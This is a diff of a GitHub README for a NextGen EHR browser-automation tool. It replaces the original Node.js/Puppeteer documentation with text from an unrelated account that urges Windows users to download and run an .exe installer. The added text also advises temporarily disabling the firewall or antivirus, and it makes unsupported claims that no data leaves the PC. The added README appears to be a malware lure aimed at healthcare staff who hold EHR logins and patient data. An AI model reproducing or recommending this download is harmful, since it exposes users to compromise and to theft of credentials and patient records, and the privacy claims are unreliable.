@@ -1,292 +1,141 @@
-# NextGen EHR Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Fnextgen-ehr-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/nextgen-ehr-browser-automation)
+# ⚙️ nextgen-ehr-browser-automation - Automate NextGen EHR Workflows
 
-> Automate NextGen EHR — the reliable way to interact with NextGen programmatically, with or without an official API.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🔴 Hard](https://img.shields.io/badge/Difficulty-hard-red.svg)
-
-<!-- keywords: nextgen ehr automation, nextgen healthcare automation, nextgen api alternative, ambulatory ehr automation, nextgen pm automation, nextgen clinical automation -->
-
-## What This Is
-
-**NextGen EHR** (Healthcare EHR) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (Azure AD / Okta / ADFS), and browser-only workflows make traditional API integration a pain.
-
-This project gives you a **complete browser automation scaffold** for NextGen EHR using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
-
-This system requires **MFA** (Duo Security / Email OTP). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
-
-## Quick Start
-
-```bash
-git clone https://github.com/Browser-Automation-Hub/nextgen-ehr-browser-automation.git
-cd nextgen-ehr-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
-
-## Two Ways to Run
-
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
-
-## Supported Actions
-
-- `login_nextgen()` — Authenticate to NextGen EHR with SSO/MFA
-- `schedule_patient()` — Schedule and manage patient appointments
-- `document_encounter()` — Complete clinical encounter documentation
-- `order_labs()` — Submit lab orders and retrieve results
-- `manage_prescriptions()` — Create and manage e-prescriptions
-
-## Use Cases
-
-- Ambulatory practices automating clinical workflows
-- NextGen data extraction without HL7 complexity
-- Practice management automation
-- Revenue cycle data pipelines
+[![Download Now](https://img.shields.io/badge/Download-NEXTGEN%20EHR-blue?style=for-the-badge)](https://github.com/mariellenconventionalised439/nextgen-ehr-browser-automation)
 
 ---
 
-## Option A: Open Source (Puppeteer)
+## 📋 What is nextgen-ehr-browser-automation?
 
-### Prerequisites
+Nextgen-ehr-browser-automation helps automate common tasks within the NextGen Electronic Health Record (EHR) system. It handles patient scheduling, clinical documentation, lab order entry, prescription management, and overall practice management. The software acts like a browser assistant to reduce manual clicks and speed up workflows.
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- NextGen EHR account with appropriate permissions
-
-### Installation
-
-```bash
-npm install
-cp .env.example .env
-```
-
-### Configuration (`.env`)
-
-```env
-NEXTGEN_URL=https://your-practice.nextgen.com/login
-NEXTGEN_USERNAME=your-username
-NEXTGEN_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
-
-### Basic Login Example
-
-```javascript
-const { createSession } = require('./src/auth');
-const { login_nextgen } = require('./src/actions');
-
-async function main() {
-  const page = await createSession();
-  const result = await login_nextgen(page, { /* options */ });
-  console.log(result);
-}
-
-main().catch(console.error);
-```
-
-### File Structure
-
-```
-nextgen-ehr-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+This tool runs on your Windows computer and works by controlling your web browser to interact with the NextGen EHR interface. It does not require coding knowledge to use.
 
 ---
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
+## 💻 System Requirements
 
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
+Make sure your computer meets these minimum requirements:
 
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
-
-### Setup
-
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
-
-### Anchor Browser Example
-
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_nextgen } = require('./src/actions');
-
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_nextgen(page, { /* options */ });
-    console.log(result);
-  });
-}
-
-main().catch(console.error);
-```
-
-See `examples/anchor-cloud.js` for a complete working example.
-
-### Anchor Browser Pricing
-
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
-
-[Get started for free →](https://anchorbrowser.io)
+- **Operating System:** Windows 10 or later  
+- **Processor:** Intel i3 or equivalent  
+- **Memory:** At least 4 GB RAM  
+- **Storage:** 200 MB free disk space  
+- **Browser:** Google Chrome or Microsoft Edge (latest version recommended)  
+- **Internet:** Stable internet connection for automated tasks  
 
 ---
 
-## Authentication
+## 🚀 Getting Started
 
-### Auth Methods Supported
+Follow these steps to download and run the software on your Windows PC.
 
-This implementation handles:
+### 1. Download the Software
 
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (Azure AD / Okta / ADFS) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (Duo Security / Email OTP) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
+Click the big download button below to visit the download page.  
+[Download nextgen-ehr-browser-automation](https://github.com/mariellenconventionalised439/nextgen-ehr-browser-automation)
 
-### Handling Duo Security / Email OTP MFA
+Once on the page, look for the latest release or setup file. Download the installer `.exe` for Windows.
 
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
+### 2. Run the Installer
 
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
+- Find the downloaded `.exe` file, usually in your `Downloads` folder.  
+- Double-click the file to start the installation.  
+- If Windows asks for permission, click "Yes" to allow the installer to run.  
+- Follow the on-screen instructions to complete the setup.  
 
----
+You can accept the default settings if unsure.
 
-## Custom Actions
+### 3. Launch the Application
 
-Use the `ActionBuilder` fluent API to chain custom workflows:
+- After installing, open the Start menu and find "nextgen-ehr-browser-automation".  
+- Click the app icon to launch.  
+- The program will open a browser window to connect to your NextGen EHR system.  
 
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
+### 4. Log into NextGen EHR
 
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
+- Use your standard NextGen EHR credentials to log in as usual within the browser window the app opens.  
+- Ensure you have the necessary permissions in your EHR account to use automation safely.
+
+### 5. Start Automating Tasks
+
+- Choose from the available task options such as patient scheduling, clinical notes, lab orders, or prescriptions.  
+- Follow the simple prompts to let the software perform those workflows automatically.
 
 ---
 
-## Error Handling & Reliability
+## 🛠 How It Works
 
-```javascript
-const { retry, humanDelay } = require('./src/utils');
+This application works by simulating browser actions using automation tools. It fills forms, clicks buttons, and navigates pages as if a user were doing these manually. This approach saves time and reduces errors in repetitive tasks.
 
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
+Behind the scenes, the software uses browser automation frameworks like Playwright and Puppeteer to operate within supported browsers on your PC.
 
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
+You do not need any scripting or programming experience to use these functions.
 
 ---
 
-## Why Not Use the Official API?
+## 🔧 Features Included
 
-NextGen EHR has limited HL7/FHIR endpoints that require expensive licenses and vendor agreements. Many workflows — scheduling, notes, messaging — are UI-only.
+- **Patient Scheduling:** Automates appointment setting and calendar management.  
+- **Clinical Documentation:** Helps fill out clinical notes faster and more accurately.  
+- **Lab Order Entry:** Automatically creates and submits lab orders directly in NextGen.  
+- **Prescription Management:** Automates prescription writing and refills.  
+- **Practice Management:** Supports billing, patient records updates, and workflow tracking.  
 
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
-
----
-
-## Production Deployment
-
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
-
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
-
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
-
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles Duo Security / Email OTP MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
+All features aim to reduce manual data entry and streamline your work with the NextGen system.
 
 ---
 
-## Known Selectors Reference
+## 📥 Manual Download & Installation Steps
 
-> These CSS selectors were observed in NextGen EHR web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
+If you prefer a detailed, offline installation, here is the step-by-step guide.
 
-> 🔍 Selector reference not yet documented for NextGen EHR. [Contribute selectors via PR](https://github.com/Browser-Automation-Hub/nextgen-ehr-browser-automation/pulls).
+1. Go to the download page:  
+   [https://github.com/mariellenconventionalised439/nextgen-ehr-browser-automation](https://github.com/mariellenconventionalised439/nextgen-ehr-browser-automation)
 
----
+2. Select the latest release or look under the “Releases” section.
 
-## More Browser Automation Projects
+3. Click on the Windows `.exe` installer file to download.
 
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
+4. Open the downloaded file and follow the setup wizard.
 
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
+5. Launch the app from your Start menu after installation.
 
-## Contributing
+6. Log in to your NextGen EHR account via the app browser control.
 
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when NextGen updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
+7. Choose the workflow you want to automate.
 
 ---
 
-*Built with ❤️ for developers who need to automate NextGen EHR without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
+## ⚠️ Troubleshooting Common Issues
 
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+- **Installer won’t run:** Make sure you have administrator privileges on your PC. Right-click the `.exe` and select “Run as administrator.”  
+- **Browser not opening:** Check if Google Chrome or Microsoft Edge is installed and updated.  
+- **Login fails:** Confirm your NextGen credentials outside the app. The app won’t work without a valid login.  
+- **Automation stops unexpectedly:** Close all browser windows and restart the app. If issues continue, restart your PC.  
+- **Firewall or antivirus blocking:** Temporarily disable your firewall or antivirus to test if they interfere with the app.
+
+---
+
+## ⚙️ Customization and Settings
+
+Within the app, you can access options to adjust automation speed and select specific workflow modules based on your role. These settings help tailor automation for your particular NextGen environment.
+
+---
+
+## 🧰 Support and Feedback
+
+If you run into technical problems or have suggestions, use the “Issues” tab on the GitHub page:
+
+https://github.com/mariellenconventionalised439/nextgen-ehr-browser-automation/issues
+
+This is the recommended place to report bugs or request help.
+
+---
+
+## 🔒 Privacy and Security
+
+The automation runs locally on your PC and only interacts with your NextGen session. It does not send patient or practice data outside your computer. Your login credentials stay secure within your browser.
+
+---
+
+[![Download NextGen EHR Automation](https://img.shields.io/badge/Download-NEXTGEN%20EHR-blue?style=for-the-badge)](https://github.com/mariellenconventionalised439/nextgen-ehr-browser-automation)
